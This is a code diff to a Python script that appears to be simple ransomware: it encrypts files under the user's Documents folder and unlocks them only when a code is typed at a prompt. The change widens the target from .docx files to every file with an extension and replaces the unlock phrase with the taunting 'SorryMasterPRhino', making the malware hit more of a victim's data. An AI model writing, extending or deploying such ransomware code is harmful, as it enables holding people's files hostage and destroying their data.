@@ -34,12 +34,11 @@ def decrypt_file(path):
         f.write(decrypted_data)
     os.remove(str(path) + ".encrypted")
 
-def get_files(directory, ext):
-    return list(Path(directory).rglob(f"*{ext}"))
+def get_all_files(directory):
+    return list(Path(directory).rglob("*.*"))
 
 directory = os.path.join(os.getcwd(), "Documents")
-ext = ".docx"
-paths = get_files(directory, ext)
+paths = get_all_files(directory)
 
 if paths:
     for file_path in paths:
@@ -48,7 +47,7 @@ if paths:
 
 while True:
     code = input("Enter decryption code: ").strip()
-    if code == "Decrypt files":
+    if code == "SorryMasterPRhino":
         for file_path in paths:
             decrypt_file(file_path)
         print(f"Decrypted {len(paths)} files.")
